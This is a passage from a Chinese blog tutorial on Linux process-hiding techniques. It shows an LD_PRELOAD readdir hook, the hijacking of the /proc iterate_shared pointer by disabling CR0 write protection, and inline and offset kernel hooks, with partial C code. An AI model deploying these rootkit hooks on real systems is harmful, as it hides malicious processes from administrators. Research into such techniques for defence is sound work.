class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int dirnamefd(DIR *dirp,char *filter_path)&#123;</span><br><span class="line"></span><br><span class="line">  int fd = dirfd (dirp);</span><br><span class="line">  if(fd == -1)&#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  char path[128]=&#123;0&#125;;</span><br><span class="line">  sprintf (path, &quot;/proc/self/fd/%d&quot;,fd);</span><br><span class="line"></span><br><span class="line">  ssize_t kk = readlink (path, filter_path, sizeof (filter_path));</span><br><span class="line">  if(kk == -1)&#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  filter_path[kk]=0;</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strcmp (path_filter,&quot;/proc&quot;)==0</span><br></pre></td></tr></table></figure><ol><li>判断获取到的文件名是否为要过滤的进程<code>PID</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcmp(content-&gt;d_name,PID)==0</span><br></pre></td></tr></table></figure><p>当都满足时，则<code>continue</code>，直接跳过针对这个文件的后续操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. gcc -shared -fPIC -o pidhidden.o newreaddir.c -ldl  //针对进程PID或者是进程名编写链接库</span><br><span class="line">2. export LD_PRELOAD=/home/lang/Desktop/pidhidden.o  //导入环境变量</span><br></pre></td></tr></table></figure><p>此时看一下<code>ps</code>命令的链接库加载顺序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ldd /usr/bin/bash</span><br><span class="line"> linux-vdso.so.1 (0x00007ffcd03e8000)</span><br><span class="line"> /home/lang/Desktop/pidhidden.o (0x00007f87ab4d5000)   //恶意插入的动态链接库</span><br><span class="line"> libprocps.so.7 =&gt; /usr/lib/libprocps.so.7 (0x00007f87ab27b000)</span><br><span class="line"> libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f87ab0b7000)</span><br><span class="line"> libdl.so.2 =&gt; /usr/lib/libdl.so.2 (0x00007f87ab0b2000)</span><br><span class="line"> libsystemd.so.0 =&gt; /usr/lib/libsystemd.so.0 (0x00007f87ab026000)</span><br><span class="line"> /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f87ab71d000)</span><br><span class="line"> libpthread.so.0 =&gt; /usr/lib/libpthread.so.0 (0x00007f87ab005000)</span><br><span class="line"> librt.so.1 =&gt; /usr/lib/librt.so.1 (0x00007f87aaff9000)</span><br><span class="line"> liblzma.so.5 =&gt; /usr/lib/liblzma.so.5 (0x00007f87aadd3000)</span><br><span class="line"> liblz4.so.1 =&gt; /usr/lib/liblz4.so.1 (0x00007f87aadb4000)</span><br><span class="line"> libgcrypt.so.20 =&gt; /usr/lib/libgcrypt.so.20 (0x00007f87aac95000)</span><br><span class="line"> libgpg-error.so.0 =&gt; /usr/lib/libgpg-error.so.0 (0x00007f87aaa75000)</span><br></pre></td></tr></table></figure><p>此刻再执行<code>ps</code>，就看不到我们指定<code>PID</code>的进程了</p><blockquote><p>可以通过<code>unset LD_PRELOAD</code>来去掉这个环境变量，恢复正常的<code>动态链接库</code>顺序</p></blockquote><blockquote><p>strace执行程序，查看<code>access()</code>项加载的配置文件，应急使用<code>busybox</code>查看具体路径，避过执行程序被修改的尴尬</p></blockquote><h3 id="sk13-hook"><a href="#sk13-hook" class="headerlink" title="sk13 hook"></a>sk13 hook</h3><blockquote><p>用户态下的<code>系统调用表</code>hook。</p></blockquote><p>暂时参照<code>hook系统调用</code>，也是走的<code>idt</code>。但是需要<code>/dev/kmem</code>的支持(或许&#x2F;dev&#x2F;mem也行？)，通过替换整个<code>sys_call_table</code>的地址来劫持系统调用。</p><ul><li><a href="https://www.cnblogs.com/allyesno/archive/2007/09/21/900795.html">相关资料</a></li></ul><h2 id="内核级-–-gt-进程隐藏"><a href="#内核级-–-gt-进程隐藏" class="headerlink" title="内核级 –&gt; 进程隐藏"></a>内核级 –&gt; 进程隐藏</h2><blockquote><p>内核级别的隐藏技术大概都和系统调用和VFS离不开关系，无非是修改了原来的系统调用或是劫持了VFS，但是再往深了说，实际上也就是劫持了内核函数。</p></blockquote><p>以ps为例子，<code>strace ps -aux</code>可以看到系统调用流程，获取的信息都来源于<code>/proc</code>这一个<code>伪文件系统</code>中</p><ul><li><code>openat</code>系统函数获取到<code>/proc</code>的文件句柄</li><li><code>getdents64</code>递归获取<code>/proc</code>下所有的文件信息</li><li><code>openat</code>或者<code>open</code>打开<code>/proc/PID/stat</code>，<code>/proc/PID/status</code>和<code>/proc/PID/cmdline</code>获取进程信息</li></ul><h3 id="ring1-劫持VFS"><a href="#ring1-劫持VFS" class="headerlink" title="ring1 劫持VFS"></a><code>ring1</code> 劫持VFS</h3><blockquote><p>可以看到上面<code>ps</code>主要就是针对<code>/proc</code>做了一个遍历，然后输出来，那么如果<code>/proc</code>下本来就没有这个<code>进程文件</code>，是不是就根本查不出来呢。</p></blockquote><p><code>VFS</code>是内核的一个抽象功能，允许不同的文件系统共存，系统中的实体文件不但依赖<code>VFS</code>共存，也依靠其协同工作，详细信息可以查看<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-vfs/index.html">从文件 I&#x2F;O 看 Linux 的虚拟文件系统</a>，而<code>/proc</code>就是<code>VFS</code>的一个具体的实现，内核中的各种信息都在此目录下具象化。 <code>proc</code>文件系统是一个<code>虚拟文件系统</code>的实现，只存在于内存，只是以<code>文件系统</code>的方式提供<code>接口</code>以用来访问内核数据。<code>用户态</code>下可以通过<code>proc</code>来获取到内核的信息，而这些信息是动态改变的，所以只有读取<code>proc</code>文件时，<code>proc</code>文件系统才会动态的从系统内核中读取信息并提交，这些返回的文件并不是都在你的系统中存在的，取决于内核配置和装载的模块。 其下的文件形成如下：</p><ol><li>一部分目录静态形成，比如<code>fs</code>，<code>fb</code>等，这些是在系统初始化时候就挂载到<code>proc</code>目录对应的<code>proc_dir_entry</code>链表下</li><li><code>.</code>和<code>..</code>子目录是当前目录和父目录的链接</li><li>其余目录则是动态生成</li></ol><p>然而针对一个<code>VFS</code>下进程信息的创建却是分类的：</p><ol><li>cat命令之类直接读取进程目录下的节点文件</li><li>ls命令列举所有的进程目录</li></ol><p>针对两种操作<code>VFS</code>其实是两种调用，针对节点信息的采用的是<code>lookup</code>系列函数，而针对目录读取的则是采用<code>readdir</code>，而列举目录也分为<code>列举</code>&#x2F;proc<code>下的目录和列举某个具体进程目录，而不管是哪种方式，最后都会调用</code>proc_pid_instantiate&#96;实例化进程目录</p><p><strong>攻击方式：劫持<code>回调函数</code>，修改返回的信息。</strong></p><blockquote><p>原指针指向函数地址0x1，创建一个新函数0x2，让指针指向0x2，然后再通过新函数去调用0x1地址的函数</p></blockquote><p>以<code>ps</code>读取为例，程序的实现还是列举了<code>/proc</code>的目录，因此还是针对目录的读取：</p><p><code>proc文件系统</code>动态获取信息的接口为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * The root /proc directory is special, as it has the</span><br><span class="line"> * &lt;pid&gt; directories. Thus we don&#x27;t use the generic</span><br><span class="line"> * directory handling functions for that..</span><br><span class="line"> */</span><br><span class="line">static const struct file_operations proc_root_operations = &#123;</span><br><span class="line"> .read = generic_read_dir,</span><br><span class="line"> .iterate_shared = proc_root_readdir,</span><br><span class="line"> .llseek = generic_file_llseek,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而上三种文件目录的实现方式则是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static int proc_root_readdir(struct file *file, struct dir_context *ctx)</span><br><span class="line">&#123;</span><br><span class="line"> if (ctx-&gt;pos &lt; FIRST_PROCESS_ENTRY) &#123;</span><br><span class="line">  int error = proc_readdir(file, ctx); //静态生成的</span><br><span class="line">  if (unlikely(error &lt;= 0))</span><br><span class="line">   return error;</span><br><span class="line">  ctx-&gt;pos = FIRST_PROCESS_ENTRY;</span><br><span class="line"> &#125;</span><br><span class="line"> return proc_pid_readdir(file, ctx);   //动态生成的</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当前系统中的所有进程在进程终止前都会存在于各种链表中，但是只有当进程处于就绪态时会被调度器调度执行，否则永远无法被调度；当进程终止时从链表中清除，从而结束其生命过程；linux中的进程有两个派系组成：内核线程，其根线程是kthreadd线程，进程号是2；用户进程，其根进程是init进程，进程号是1,1号和2号进程是并列的，在系统初始化后期由内核同时创建。而实际的遍历函数是由<code>proc_root_readdir</code>实现的，而它则是一个<code>file_operations</code>的成员<code>iterate_shared</code></p><blockquote><p>linux里面所有的文件操作，底层都要实现一个<code>file_operations</code>，里面的成员是针对该文件的操作集，此处概念参考<a href="https://www.cnblogs.com/embedded-linux/p/5663176.html">linux虚拟文件系统vfs</a>，说的简单一点就是内核用来处理各种请求的函数的地址。这个在&#96;&#96;下有定义。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">struct file_operations &#123;</span><br><span class="line"> struct module *owner;</span><br><span class="line"> loff_t (*llseek) (struct file *, loff_t, int);</span><br><span class="line"> ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);</span><br><span class="line"> ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);</span><br><span class="line"> ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line"> ssize_t (*write_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line"> int (*iterate) (struct file *, struct dir_context *);</span><br><span class="line"> int (*iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line"> __poll_t (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line"> long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);</span><br><span class="line"> long (*compat_ioctl) (struct file *, unsigned int, unsigned long);</span><br><span class="line"> int (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line"> unsigned long mmap_supported_flags;</span><br><span class="line"> int (*open) (struct inode *, struct file *);</span><br><span class="line"> int (*flush) (struct file *, fl_owner_t id);</span><br><span class="line"> int (*release) (struct inode *, struct file *);</span><br><span class="line"> int (*fsync) (struct file *, loff_t, loff_t, int datasync);</span><br><span class="line"> int (*fasync) (int, struct file *, int);</span><br><span class="line"> int (*lock) (struct file *, int, struct file_lock *);</span><br><span class="line"> ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);</span><br><span class="line"> unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);</span><br><span class="line"> int (*check_flags)(int);</span><br><span class="line"> int (*flock) (struct file *, int, struct file_lock *);</span><br><span class="line"> ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);</span><br><span class="line"> ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);</span><br><span class="line"> int (*setlease)(struct file *, long, struct file_lock **, void **);</span><br><span class="line"> long (*fallocate)(struct file *file, int mode, loff_t offset,</span><br><span class="line">     loff_t len);</span><br><span class="line"> void (*show_fdinfo)(struct seq_file *m, struct file *f);</span><br><span class="line">#ifndef CONFIG_MMU</span><br><span class="line"> unsigned (*mmap_capabilities)(struct file *);</span><br><span class="line">#endif</span><br><span class="line"> ssize_t (*copy_file_range)(struct file *, loff_t, struct file *,</span><br><span class="line">   loff_t, size_t, unsigned int);</span><br><span class="line"> loff_t (*remap_file_range)(struct file *file_in, loff_t pos_in,</span><br><span class="line">       struct file *file_out, loff_t pos_out,</span><br><span class="line">       loff_t len, unsigned int remap_flags);</span><br><span class="line"> int (*fadvise)(struct file *, loff_t, loff_t, int);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>而<code>proc_root_readdir</code>实际上就是<code>iterate_shared</code>指向的函数地址，即<code>file_operations-&gt;iterate_shared</code>，因此实现攻击上只需要把这个指针的指向改了就行。</p><blockquote><p>老版本的内核这个函数传参中包含了一个函数，所以可以通过修改传入的函数修改逻辑，但是新版本的不行了，所以很难受，就得新研究下。</p></blockquote><p>看一下<code>proc_pid_readdir</code>的实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int proc_pid_readdir(struct file *file, struct dir_context *ctx)</span><br><span class="line">&#123;</span><br><span class="line">    //TODO</span><br></pre></td></tr></table></figure><p>我们控制的<code>PID</code>，因此看一下是哪个参数中传进来的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">loff_t pos = ctx-&gt;pos</span><br><span class="line">iter.tgid = pos - TGID_OFFSET;</span><br></pre></td></tr></table></figure><p>接着看后面有一个针对<code>pos</code>的判断，其中前置条前条件为<code>#define TGID_OFFSET (FIRST_PROCESS_ENTRY + 2)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if (pos &gt;= PID_MAX_LIMIT + TGID_OFFSET)</span><br><span class="line"> return 0;</span><br><span class="line"></span><br><span class="line">if (pos == TGID_OFFSET - 2) &#123;</span><br><span class="line"> struct inode *inode = d_inode(ns-&gt;proc_self);</span><br><span class="line"> if (!dir_emit(ctx, &quot;self&quot;, 4, inode-&gt;i_ino, DT_LNK))</span><br><span class="line">  return 0;</span><br><span class="line"> ctx-&gt;pos = pos = pos + 1;</span><br><span class="line">&#125;</span><br><span class="line">if (pos == TGID_OFFSET - 1) &#123;</span><br><span class="line"> struct inode *inode = d_inode(ns-&gt;proc_thread_self);</span><br><span class="line"> if (!dir_emit(ctx, &quot;thread-self&quot;, 11, inode-&gt;i_ino, DT_LNK))</span><br><span class="line">  return 0;</span><br><span class="line"> ctx-&gt;pos = pos = pos + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来分析下条件：</p><ul><li><code>PID_MAX_LIMIT + TGID_OFFSET</code>标志着目录遍历结束</li><li><code>TGID_OFFSET - 2</code>是<code>init</code>进程，进程号1</li><li><code>TGID_OFFSET - 1</code>是<code>kthread</code>线程，进程号是2</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static inline bool dir_emit(struct dir_context *ctx,</span><br><span class="line">       const char *name, int namelen,</span><br><span class="line">       u64 ino, unsigned type)</span><br><span class="line">&#123;</span><br><span class="line"> return ctx-&gt;actor(ctx, name, namelen, ctx-&gt;pos, ino, type) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果搞了半天还是一个回调函数<code>ctx-&gt;actor</code>，继续追下去最后发现此函数来源于一个函数指针<code>filldir_t</code>，这是<code>filldir</code>函数类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * This is the &quot;filldir&quot; function type, used by readdir() to let</span><br><span class="line"> * the kernel specify what kind of dirent layout it wants to have.</span><br><span class="line"> * This allows the kernel to read directories into kernel space or</span><br><span class="line"> * to have different dirent layouts depending on the binary type.</span><br><span class="line"> */</span><br><span class="line">struct dir_context;</span><br><span class="line">typedef int (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64,</span><br><span class="line">    unsigned);</span><br><span class="line"></span><br><span class="line">struct dir_context &#123;</span><br><span class="line"> filldir_t actor;</span><br><span class="line"> loff_t pos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>进程在<code>proc</code>目录下展示的是一个个数字组成的目录，通过<code>proc_fill_cache</code>来建立每个目录的层次结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (!proc_fill_cache(file, ctx, name, len,</span><br><span class="line">       proc_pid_instantiate, iter.task, NULL)) &#123;</span><br><span class="line"> put_task_struct(iter.task);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在此之前则会先遍历<code>pid</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (iter = next_tgid(ns, iter);</span><br><span class="line">     iter.task;</span><br><span class="line">     iter.tgid += 1, iter = next_tgid(ns, iter)) </span><br></pre></td></tr></table></figure><p>而<code>next_tgid</code>中有一个关键函数<code>find_ge_pid</code>，若<code>ns</code>即进程存在，则填写<code>iter.gid</code>和<code>task_struct</code>结构，其中<code>ns</code>的内容是<code>filp-&gt;f_dentry-&gt;d_sb-&gt;s_fs_info</code>也就是<code>pid</code>的命名空间，系统唯一。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pid = find_ge_pid(iter.tgid, ns);</span><br></pre></td></tr></table></figure><p>后进入到单个进程的操作逻辑中，建立单个进程的目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">char name[PROC_NUMBUF];</span><br><span class="line">int len;</span><br><span class="line">cond_resched();~~</span><br><span class="line">if (!has_pid_permissions(ns, iter.task, HIDEPID_INVISIBLE))</span><br><span class="line">   continue;</span><br><span class="line">len = snprintf(name, sizeof(name), &quot;%d&quot;, iter.tgid);  //</span><br><span class="line">ctx-&gt;pos = iter.tgid + TGID_OFFSET;</span><br><span class="line">if (!proc_fill_cache(file, ctx, name, len,</span><br><span class="line">         proc_pid_instantiate, iter.task, NULL)) &#123;</span><br><span class="line">put_task_struct(iter.task);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>proc_fill_cache</code>负责建立一个<code>dentry</code>结构，与父目录形成层次结构，而传参中还有一个<code>proc_pid_instantiate</code>负责建立<code>inode</code>结构，并填写<code>inode_operations</code>和<code>file_operations</code>结构。 <del>代码逻辑卡住，待续。。。</del> 到此利用的方式就十分明显了，因为在循环中可以优先获取到每一个进程结构体<code>task_struct</code>，那么可以通过<code>task_struct</code>中的<code>comm</code>来筛选要过滤的进程，直接跳过当前的循环不进入到<code>proc_fill_cache()</code>函数中，这也就不会在<code>/proc</code>下产生目录结构体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(strcmp(&quot;bash&quot;,iter.task-&gt;comm)==0)&#123;</span><br><span class="line"> printk(&quot;Hidden process is [tgid:%d][pid:%d]:%s\n&quot;,ctx-&gt;pos,iter.task-&gt;pid,iter.task-&gt;comm);</span><br><span class="line"> continue;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>VFS</code>层的劫持主要还是针对的<code>文件操作集</code>，因此首先就得先找到要劫持的操作的<code>函数地址</code>和<code>函数指针</code>，然后替换调<code>函数指针</code>指向的地址。</p><p>对于外界来说，看起来还像是在用<code>proc_root_readdir()</code>函数，但是实际上使用的是可以控制的<code>hack_proc_root_readdir()</code>函数，这点可以通过替换指针很容易做到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int __init hack_kernel(void)&#123;</span><br><span class="line">  printk(&quot;Kernel VFS hacked!!&quot;);</span><br><span class="line">  struct file *getfile;</span><br><span class="line">  struct file_operations *getfile_op;</span><br><span class="line"></span><br><span class="line">  getfile = filp_open(&quot;/proc&quot;,O_RDONLY,0);</span><br><span class="line">  if(IS_ERR(getfile))&#123;</span><br><span class="line">    printk(&quot;open proc error\n&quot;);</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  origin_proc_root = getfile-&gt;f_op-&gt;iterate_shared;</span><br><span class="line">  getfile_op = getfile-&gt;f_op;</span><br><span class="line">  set_addr_rw();</span><br><span class="line">  getfile_op-&gt;iterate_shared = hack_proc_root_readdir;</span><br><span class="line">  set_addr_ro();</span><br><span class="line">  filp_close(getfile,0);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其中涉及到<code>内存读写保护</code>的问题，可以通过控制<code>cr0</code>寄存器来解决。也就是针对<code>cr0</code>寄存器的第<code>16</code>位置<code>0/1</code>操作</p></blockquote><p>已经劫持了指定的<code>文件操作</code>，那就是要重写相应的<code>操作函数</code>，倘若内核开启了<code>CONFIG_KALLSYMS</code>就可以通过调用<code>kallsyms_lookup_name</code>来快速重写函数，如果没有开启的话，则只能自己重新实现该函数了，那工程量其实比较大。</p><blockquote><p>针对VFS的劫持还有<code>proc_root_lookup</code>的劫持，这个和<code>proc_root_readdir</code>是相同的操作，因此不做过多赘述。</p></blockquote><h2 id="ring0-Inline-hook"><a href="#ring0-Inline-hook" class="headerlink" title="ring0 Inline hook"></a>ring0 Inline hook</h2><h3 id="Jmp修改劫持内核函数，修改返回信息"><a href="#Jmp修改劫持内核函数，修改返回信息" class="headerlink" title="Jmp修改劫持内核函数，修改返回信息"></a><code>Jmp</code>修改劫持内核函数，修改返回信息</h3><blockquote><p>下面一段信息参照<a href="https://blog.csdn.net/dog250/article/details/84201114">Linux内核如何替换内核函数并调用原始函数</a></p></blockquote><p>现在的计算机基本都是<code>冯诺依曼式的统一存储式计算机</code>，即指令与数据存在一起，那就代表可以在操作系统层面任意解释内存空间的含义。</p><ol><li>将函数地址对应的物理内存映射成可写</li><li>用<code>jmp</code>指令替换函数</li><li>解除可写映射</li></ol><blockquote><p>借用一下这张图，虽然我并非完全按照这张图实现的，但是画得确实不错。</p></blockquote><p><a href="https://github.com/g0dA/linuxStack/blob/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/3caab1b1-78b8-401a-b52c-83e84ce9bb3e.png"><img src="https://github.com/g0dA/linuxStack/raw/master/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2-%E6%94%BB%E7%AF%87_files/3caab1b1-78b8-401a-b52c-83e84ce9bb3e.png" alt="å�¨è¿�é��æ��å�¥å�¾ç��æ��è¿°"></a></p><p>关于<code>jmp</code>的方法大概就是<code>近跳转(Near Jmp)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp dst_address_offset </span><br></pre></td></tr></table></figure><p>而<code>dst_address_offset=目的地址 - HOOK点开始位置 - jmp指令占用地址(此命令共占用5个地址)</code></p><blockquote><p>5个地址是因为<code>jmp</code>指令占5个地址，而<code>hook</code>的目的就是把<code>jmp</code>指令替换掉原函数的开头。</p></blockquote><p>首先就是获取原函数地址，这个在不讲其余办法的情况下依然优先选择<code>kallsyms</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">origin_proc_pid_readdir = kallsyms_lookup_name(&quot;proc_pid_readdir&quot;);</span><br></pre></td></tr></table></figure><p>为了后面卸载模块恢复，先备份将要被覆盖的前五个字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsigned char origin_readdir[5]=&#123;0&#125;;</span><br><span class="line">memcpy(origin_readdir,origin_proc_pid_readdir,5);</span><br></pre></td></tr></table></figure><p>构造跳转指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">unsigned char jmpop[5]=&#123;0xe9,0,0,0,0&#125;;</span><br><span class="line">    ......</span><br><span class="line">hook_offset = (unsigned long)new_proc_pid_readdir - (unsigned long)origin_proc_pid_readdir-5;</span><br><span class="line">(*(unsigned long*)(jmpop+1))=hook_offset;</span><br></pre></td></tr></table></figure><p>解除内存写保护后开始劫持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set_addr_rw();</span><br><span class="line">memcpy(origin_proc_pid_readdir,jmpop,5);</span><br><span class="line">set_addr_ro();</span><br></pre></td></tr></table></figure><h3 id="Offset-hook"><a href="#Offset-hook" class="headerlink" title="Offset hook"></a>Offset hook</h3><blockquote><p>基础技术都是通过覆盖原指令来进行劫持，但是这样容易通过查找<code>jmp</code>，<code>push ret</code>等指令查找出来，因此可以在不增加新的指令的情况下，直接修改offset来实现隐藏的目的。</p></blockquote><p>反汇编看一下代码可以看出<code>proc_pid_readdir</code>在<code>proc_root_readdir</code>中的调用形式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gef➤ disassemble proc_root_readdir</span><br><span class="line">    ......</span><br><span class="line">    0xc10e26b5 &lt;+50&gt;: call 0xc10e4c30 &lt;proc_pid_readdir&gt;</span><br></pre></td></tr></table></figure><p>新的劫持方式的理念在于内核函数的功能逻辑一般不可能完全写在一个函数中，必然存在上下层的函数调用，比如<code>proc_root_readdir</code>-&gt;<code>proc_pid_readdir</code>，那么通过修改下层函数在上层函数中的<code>offset</code>就能使得上层函数在调用下层函数时跳到我们的新函数中。 需要的东西:</p><ul><li>上层函数地址</li><li>劫持函数地址</li><li>新函数地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsigned char *fun = (char *)kallsyms_lookup_name(&quot;proc_root_readdir&quot;);  //上层函数地址</span><br><span class="line">origin_proc_pid_readdir = 